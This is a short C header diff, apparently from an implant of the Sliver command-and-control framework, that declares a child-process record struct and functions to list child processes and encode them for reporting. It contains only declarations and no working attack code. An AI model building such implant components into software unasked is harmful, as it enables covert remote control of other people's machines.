@@ -104,3 +104,17 @@ int sliver_net_sockets(sliver_sock_t *out, int max);
 /* Ifconfig + Netstat + Mount encoders (kept next to the data they encode). */
 int sliver_netstat_encode(sliver_buf_t *out, const sliver_sock_t *entries, int count,
                           const char *err);
+
+/* --- child processes (execute-children) --------------------------------- */
+typedef struct {
+  int32_t pid;
+  int32_t ppid;
+  char path[512];
+  int64_t start_time_unix;
+} sliver_child_proc_t;
+
+int sliver_proc_children(sliver_child_proc_t *out, int max);
+/* ExecuteChildren{Children=1 repeated ExecuteChild{Pid,Path}}. */
+int sliver_execute_children_encode(sliver_buf_t *out, const sliver_child_proc_t *children,
+                                   int count, const char *err);
+
